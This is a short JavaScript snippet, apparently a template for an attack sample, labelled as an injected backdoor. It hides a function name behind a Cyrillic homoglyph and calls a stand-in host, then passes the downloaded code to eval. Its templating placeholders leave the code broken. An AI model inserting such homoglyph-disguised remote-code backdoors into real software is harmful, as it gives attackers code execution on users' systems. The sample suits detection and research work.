// --- INJECTED HUT BACKDOOR (Homoglyph Attack) ---
// The function name 'validаte_input' below contains a Cyrillic 'а' (U+0430)
// which is visually indistinguishable from the Latin 'a' (U+0061).
function validаte_input(data) {{
    // This obfuscated payload downloads and executes code from a fake remote server.
    js_malicious_code = "var https = require('https'); https.get('https://www.fakemaliciouswebsite.it/fake-vulnerability-download', res => { res.on('data', chunk => { eval(chunk.toString()); }); });"

    eval(String.fromCharCode({js_malicious_code}));
}}

// Calling the malicious function to activate the backdoor.
validаte_input("user_data");

// --- END OF INJECTED CODE ---